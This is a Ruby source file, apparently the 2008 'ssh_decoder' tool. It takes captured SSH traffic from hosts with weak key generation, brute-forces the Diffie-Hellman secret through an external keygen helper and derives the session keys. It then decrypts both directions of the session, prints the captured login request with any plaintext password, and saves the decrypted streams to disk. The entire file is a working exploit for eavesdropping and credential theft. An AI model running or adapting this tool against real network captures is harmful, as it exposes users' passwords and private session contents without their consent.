#!/usr/bin/env ruby
# ssh_decoder
#
# Copyright 2008 Yoann Guillot, Raphaël Rigo
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.


# usage : ./decryptssh.rb [-v] clientserver_stream.dat serverclient_stream.dat (order does not matter)
# use tcpick to create streams from a pcap
# most options are forwarded to ./keygen

require 'optparse'

opts = {:pidrange => '0-0x7fff', :cpus => 1 }
OptionParser.new { |o|
	o.on('-n cpus', '--n-cpu cpus') { |i| opts[:cpus] = i.to_i }
	o.on('-h num', '--child-pid num') { |i| opts[:child_pid] = i.to_i }
	o.on('-p pidrange', '--pid-range pidrange') { |i| opts[:pidrange] = i }
	o.on('-s', '--server', '--vulnerable-server') { |i| opts[:client] = false }
	o.on('-c', '--client', '--vulnerable-client') { |i| opts[:client] = true }
	o.on('-S shared_secret_hex', '--secret shared_secret_hex', '--shared-secret shared_secret_hex') { |i| opts[:shared] = i }
	o.on('-v') { $VERBOSE = true }
}.parse!(ARGV)

class Stream
	attr_accessor :data, :ptr, :banner, :maclen, :deciphlen, :decipher, :packets, :compr
	def initialize(str)
		@data = str
		@ptr = 0
		@maclen = 0
		@banner = ''
		@packets = []
		@decipher = nil
		@compr = nil
	end

	def read(len=@data.length-@ptr)
		@ptr += len
		@data[@ptr-len, len].to_s
	end

	def readbanner
		@banner = read(@data.index("\n", @ptr)-@ptr+1)
		puts @banner if $VERBOSE
		@banner
	end

	def readpacket
		ciphlen = CipherBlockSize[@decipher.name] rescue nil if @decipher
		ciphlen ||= 16
 		buf = read(ciphlen)
 		buf = @decipher.update(buf) if @decipher
 		p buf if $DEBUG

 		length = buf.unpack('N').first
		if length > 0x10_0000
			@decipher.update read(16)
			mac = read(@maclen)
			@packets << SshPacket.new(buf.length+1, 0.chr+buf, '', mac)
			return @packets.last
		end
		tbuf = read(length + 4 - ciphlen)
		tbuf = @decipher.update(tbuf) if @decipher and not tbuf.empty?
		buf = buf[4..-1] << tbuf

		mac = read(@maclen)

		pad = buf[0]
		payload = buf[1...-pad]
		pad = buf[-pad, pad]
		case @compr
		when 'none'
		when 'zlib': payload = @zlib.inflate(payload)
		end

		@packets << SshPacket.new(length, payload, pad, mac)
		@packets.last
	end

	def readstream
		@zlib = ZLib::Inflate.new(nil) if @compr == 'zlib'
		nil while @ptr < @data.length and not ['DISCONNECT', 'NEWKEYS'].include? readpacket.type
		puts if $VERBOSE
	end

	def [](type)
		return @packets.find { |pkt| pkt.type == type }
	end

	def to_s
		@packets.join(', ')
	end
end

class SshPacket
	SSH_MSG = {
		'DISCONNECT' => 1,
		'IGNORE' => 2,
		'UNIMPLEMENTED' => 3,
		'DEBUG' => 4,
		'SERVICE_REQUEST' => 5,
		'SERVICE_ACCEPT' => 6,
		'KEXINIT' => 20,
		'NEWKEYS' => 21,
		'DH_GEX_REQUEST_OLD' => 30,
		'DH_GEX_GROUP' => 31,
		'DH_GEX_INIT' => 32,
		'DH_GEX_REPLY' => 33,
		'DH_GEX_REQUEST' => 34,
		'USERAUTH_REQUEST' => 50,
		'USERAUTH_FAILURE' => 51,
		'USERAUTH_SUCCESS' => 52,
		'USERAUTH_BANNER' => 53,
		'CHANNEL_OPEN' => 90,
		'CHANNEL_OPEN_CONFIRMATION' => 91,
		'CHANNEL_OPEN_FAILURE' => 92,
	}

	attr_accessor :length, :payload, :pad, :mac, :interpreted, :type
	def initialize(length, payload, pad, mac)
		@length, @payload, @pad, @mac = length, payload, pad, mac

		interpret
	end

	def bin
		[@length].pack('N') << @pad.length << @payload << @pad
	end

	def to_s
		@payload
	end

	def interpret
		ptr = 0
		read = proc { |n| ptr += n ; @payload[ptr-n, n].to_s }
		readint = proc { read[4].unpack('N').first }
		readstr = proc { read[readint[]] }
		readstrlist = proc { readstr[].split(',') }
		@type = read[1][0]
		if SSH_MSG.index(@type)
			@type = SSH_MSG.index(@type)
		end

		case @type
		when 'KEXINIT'
			@interpreted = { :cookie => read[16],
				:kex_algorithms => readstrlist[],
				:server_host_key_algorithms => readstrlist[],
				:ciph_c2s => readstrlist[],
				:ciph_s2c => readstrlist[],
				:mac_c2s => readstrlist[],
				:mac_s2c => readstrlist[],
				:compr_c2s => readstrlist[],
				:compr_s2c => readstrlist[],
				:lang_c2s => readstrlist[],
				:lang_s2c => readstrlist[],
				:first_kex_follows => read[1][0],
				:reserved => read[4]
			}
		when 'DH_GEX_INIT'
			@interpreted = { :e => readstr[] }
		when 'DH_GEX_GROUP'
			@interpreted = { :p => readstr[], :g => readstr[] }
		when 'DH_GEX_REPLY'
			@interpreted = { :key => readkeyblob(readstr[]), :f => readstr[], :sign => readstr[] }
		when 'SERVICE_REQUEST', 'SERVICE_ACCEPT'
			@interpreted = { :service => readstr[] }
		when 'DISCONNECT'
			@interpreted = { :reason => readint[], :msg => readstr[], :lang => readstr[] }
		when 'USERAUTH_REQUEST'
			@interpreted = { :username => readstr[], :nextservice => readstr[], :auth_method => readstr[] }
			case @interpreted[:auth_method]
			when 'none'
			when 'password'
				@interpreted[:change] = read[1][0]
				@interpreted[:password] = readstr[]
			when 'publickey'
				@interpreted[:testic] = read[1][0]
				@interpreted[:keytype] = readstr[]
				@interpreted[:key] = readkeyblob(readstr[])
			else
				@interpreted[:data] = read[@payload.length]
			end
		when 'USERAUTH_FAILURE'
			@interpreted = { :meth_allowed => readstr[] }
		when 'USERAUTH_SUCCESS'
			@interpreted = {}
		when 'CHANNEL_DATA'
			@interpreted = { :wat => readint[], :data => readstr[] }
			if @interpreted[:wat] == 0
				@interpreted.delete :wat
				p @interpreted[:data] if $VERBOSE
				return
			end
		when 'CHANNEL_CLOSE'
			@interpreted = { :foo => readint[] }
		else
			@interpreted = { :data => read[@payload.length-1] }
		end
		p @type, @interpreted if $VERBOSE
	end

	def [](x)
		@interpreted[x]
	end
end

def readkeyblob(str)
	ptr = 0
	read = proc { |n| ptr += n ; str[ptr-n, n] }
	readstr = proc { read[read[4].unpack('N').first] }
	ret = {}
	ret[:type] = readstr[]
	case ret[:type]
	when 'ssh-rsa': [:e, :n]
	when 'ssh-dss': [:p, :q, :g, :y] # TODO check order
	else ret[:unknown] = read[str.length] ; []
	end.map { |k| ret[k] = readstr[] }
	ret
end
def makekeyblob(key)
	key[:type].sbin +
	case key[:type]
	when 'ssh-rsa': [:e, :n]
	when 'ssh-dss': [:p, :q, :g, :y]
	end.map { |e| key[e].sbin }.join
end

def find_matching_alg(client, server)
	client.find { |c| server.include? c }
end

class String
	def sbin
		[length].pack('N') << self
	end

	def allhex
		self.unpack('H*')
	end
end

require 'openssl'
CipherKeySize = {
	"none" => 8,
	"des" => 8, "3des" => 16, "3des-cbc" => 24,
	"blowfish" => 32, "blowfish-cbc" => 16,
	"cast128-cbc" => 16,
	"arcfour" => 16, "arcfour128" => 16, "arcfour256" => 32,
	"aes128-cbc" => 16, "aes192-cbc" => 24, "aes256-cbc" => 32,
	"rijndael-cbc@lysator.liu.se" => 32,
	"aes128-ctr" => 16, "aes192-ctr" => 24, "aes256-ctr" => 32,
}
CipherBlockSize = {
	"none" => 8,
	 "des" => 8, "3des" => 8, "3des-cbc" => 8,
	 "blowfish" => 8, "blowfish-cbc" => 8,
	 "cast128-cbc" => 8,
	 "arcfour" => 8, "arcfour128" => 8, "arcfour256" => 8,
	 "aes128-cbc" => 16, "aes192-cbc" => 16, "aes256-cbc" => 16,
	 "rijndael-cbc@lysator.liu.se" => 16,
	 "aes128-ctr" => 16, "aes192-ctr" => 16, "aes256-ctr" => 16,
}

class AESCtr
	attr_accessor :aes
	def initialize(bitsize=128)
		@aes = OpenSSL::Cipher::Cipher.new("aes-#{bitsize}-ecb")
		@aes.encrypt
		@tmpbuf = ''
	end

	def update(data)
		@tmpbuf << data
		ret = ''
		while @tmpbuf.length >= 16
			buf = @tmpbuf[0, 16]
			@tmpbuf = @tmpbuf[16..-1]
			ciph = @aes.update(@iv)
			increment_counter
			ret << buf.unpack('C*').zip(ciph.unpack('C*')).map { |a, b| a^b }.pack('C*')
		end
		ret
	end

	def increment_counter
		16.times { |i|
			i = 15-i
			if @iv[i] == 255
				@iv[i] = 0
			else
				@iv[i] += 1
				break
			end
		}
	end

	def iv=(iv) @iv = iv[0, 16] end
	def iv ; @iv end
	def decrypt ; end
	def encrypt ; end

	def method_missing(*a)
		@aes.send(*a)
	end
end

# open the streams
stream1 = Stream.new File.open(ARGV.shift, 'rb') { |fd| fd.read }
stream2 = Stream.new File.open(ARGV.shift, 'rb') { |fd| fd.read }

# read the streams
puts " * read handshake"
abort '1st file has no SSH banner' if stream1.readbanner[0, 4] != 'SSH-'
stream1.readstream
abort '2nd file has no SSH banner' if stream2.readbanner[0, 4] != 'SSH-'
stream2.readstream

# TODO : detect vulnerable OpenSSH versions based on banners

# identify client/server
# TODO : handle shitty clients/servers like dropbear which do not use GEX
# but instead use predefined groups
cs = [stream1, stream2].find { |stream| stream['DH_GEX_INIT' ] }
ss = [stream1, stream2].find { |stream| stream['DH_GEX_REPLY'] }

# determine algorithms
kex_c = cs['KEXINIT']
kex_s = ss['KEXINIT']
cipher = find_matching_alg(cs['KEXINIT'][ :ciph_c2s], ss['KEXINIT'][ :ciph_s2c])
mac    = find_matching_alg(cs['KEXINIT'][  :mac_c2s], ss['KEXINIT'][  :mac_s2c])
compr  = find_matching_alg(cs['KEXINIT'][:compr_c2s], ss['KEXINIT'][:compr_s2c])
# for kex_hash get the last part of the algorithm names
kex_hash = find_matching_alg(cs['KEXINIT'][:kex_algorithms], ss['KEXINIT'][:kex_algorithms]).split('-').last

puts "cipher: #{cipher}, mac: #{mac}, kex_hash: #{kex_hash}, compr: #{compr}"

puts " * bruteforce DH"
groupinfo = ss['DH_GEX_GROUP']
gex_reply = ss['DH_GEX_REPLY']
gex_init  = cs['DH_GEX_INIT']
needed_bits = CipherKeySize[cipher] * 8 * 2

if opts[:client]
	weak_key = gex_init[:e].allhex
	other_key = gex_reply[:f].allhex
else
	other_key = gex_init[:e].allhex
	weak_key = gex_reply[:f].allhex
end

if opts[:shared]
	shared_secret = opts[:shared]
else
	args = { 'b' => needed_bits, 'p' => opts[:pidrange], (opts[:client] ? 'c' : 's') => '',
		'G' => groupinfo[:g].allhex, 'P' => groupinfo[:p].allhex,
		'k' => weak_key, 'K' => other_key, 'n' => opts[:cpus]}
	if not opts[:client]
		args.update 'r' => gex_reply[:key][:n].allhex if gex_reply[:key][:n]
		args.update 'h' => opts[:child_pid] if opts[:child_pid]
	end
	commandline = "./keygen " + args.sort.map { |k, v| "-#{k} #{v}" }.join(' ')

	puts commandline if $VERBOSE
	ENV['ENVIRON'] = "ubuntu-7.04-x86-patched" if not ENV['ENVIRON']
	bruteforce_out = File.read('bruteforce_out')
	puts bruteforce_out if $VERBOSE
	#abort "Bruteforce failed" if not $?.exited? or $?.exitstatus != 0
	shared_secret = bruteforce_out.split("\n")[-2]
	shared_secret = '00' + shared_secret if shared_secret[0, 1].to_i(16) >= 8
end
puts "DH shared secret : " + shared_secret

puts " * derive keys"
dh_size_request = (cs['DH_GEX_REQUEST'] || cs['DH_GEX_REQUEST_OLD']).payload[1..-1]
blob = [cs.banner.chomp, ss.banner.chomp, cs['KEXINIT'].payload, ss['KEXINIT'].payload,
	makekeyblob(gex_reply[:key])].map { |e| e.sbin }.join + dh_size_request +
	[groupinfo[:p], groupinfo[:g], gex_init[:e], gex_reply[:f], [shared_secret].pack('H*')].map { |e| e.sbin }.join
puts blob.allhex.first.scan(/.{0,32}/) if $DEBUG
handshake_hash = OpenSSL::Digest::Digest.digest(kex_hash, blob).allhex.first
puts "handshake hash : " + handshake_hash if $VERBOSE

we_need = CipherKeySize[cipher]
session_id = handshake_hash
derived = ['A', 'B', 'C', 'D', 'E', 'F'].map { |let|
	k_h = [shared_secret.length/2, shared_secret].pack('NH*') + [handshake_hash].pack('H*')

	key = OpenSSL::Digest::Digest.digest(kex_hash, k_h + let + [session_id].pack('H*'))

	# Derive a longer key if needed
	while key.length < we_need
		key << OpenSSL::Digest::Digest.digest(kex_hash, k_h+key)
	end

	key[0, we_need]
}

puts 'derived keys : ', derived.map { |k| k.allhex } if $VERBOSE


puts ' * decipher streams'
cipher = OpenSSL::Cipher.ciphers.find { |cp| cp.gsub('-', '').downcase == cipher.gsub('-', '').downcase } || cipher	# 'aes128-cbc' => 'aes-128-cbc'
puts "Cipher : #{cipher}" if $VERBOSE
case cipher
when /aes(\d+)-ctr/i
	bitsize = $1.to_i
	c2s = AESCtr.new bitsize
	s2c = AESCtr.new bitsize
else
	c2s = OpenSSL::Cipher::Cipher.new(cipher)
	s2c = OpenSSL::Cipher::Cipher.new(cipher)
	c2s.decrypt
	s2c.decrypt
end

c2s.padding = 0
c2s.iv = derived[0]
c2s.key = derived[2]
cs.decipher = c2s
cs.compr = compr
s2c.padding = 0
s2c.iv = derived[1]
s2c.key = derived[3]
ss.decipher = s2c
ss.compr = compr

case mac
when 'hmac-md5'
	cs.maclen = ss.maclen = 16
when 'hmac-sha1'
	cs.maclen = ss.maclen = 20
else
	raise 'unsupported HMAC'
end

cs.readstream
ss.readstream

# dump credentials
if ss['USERAUTH_SUCCESS']
	puts ' * successful authentication packet'
	auth = cs.packets.find_all { |p| p.type == 'USERAUTH_REQUEST' }.last
	begin
		require 'pp'
		pp auth.interpreted
	rescue LoadError
		p auth.interpreted
	end
end

# dump streams
i = 0
i += 1 while File.exist?(cfile = "sshdecrypt.#{i}.client.dat") or File.exist?(sfile = "sshdecrypt.#{i}.server.dat")
File.open(cfile, 'wb') { |fd| cs.packets.each { |p| fd.write p.payload } }
File.open(sfile, 'wb') { |fd| ss.packets.each { |p| fd.write p.payload } }
puts " * deciphered streams saved to #{cfile.inspect} & #{sfile.inspect}"
